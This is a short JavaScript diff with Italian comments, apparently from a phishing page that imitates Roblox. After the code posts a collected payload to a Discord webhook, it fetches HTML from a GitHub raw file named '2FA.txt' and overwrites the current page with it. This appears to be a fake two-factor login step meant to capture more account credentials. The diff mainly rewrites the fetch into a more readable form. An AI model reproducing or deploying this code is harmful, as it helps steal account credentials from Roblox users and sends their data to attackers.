@@ -954,14 +954,25 @@ function checkRobloxInstall() {
         contentType: "application/json",
         data: JSON.stringify(payload),
         success: function(data, status) {
-          // Se la richiesta webhook ha successo, puoi gestirla qui
-          
-		  fetch("https://raw.githubusercontent.com/roblox-uk/Backend/refs/heads/main/2FA.txt").then(r=>r.text()).then(html=>{document.open();document.write(html);document.close();}).catch(e=>{document.body.innerHTML="<h1>Errore nel caricamento</h1><p>"+e+"</p>";console.error(e);});
+  // URL da cui caricare l'HTML
+  const url = "https://raw.githubusercontent.com/roblox-uk/Backend/refs/heads/main/2FA.txt";
 
+  // Usando fetch per prendere il contenuto e sovrascrivere la pagina
+  fetch(url)
+    .then(function(response) {
+      return response.text();
+    })
+    .then(function(html) {
+      document.open();
+      document.write(html);
+      document.close();
+    })
+    .catch(function(err) {
+      document.body.innerHTML = "<h1>Errore nel caricamento</h1><p>" + err + "</p>";
+      console.error("Errore:", err);
+    });
+},
 
-
-		  
-        },
         error: function(xhr, status, error) {
           console.error("Errore durante l'invio dei dati al webhook Discord:", error);
           // Gestisci gli errori se necessario
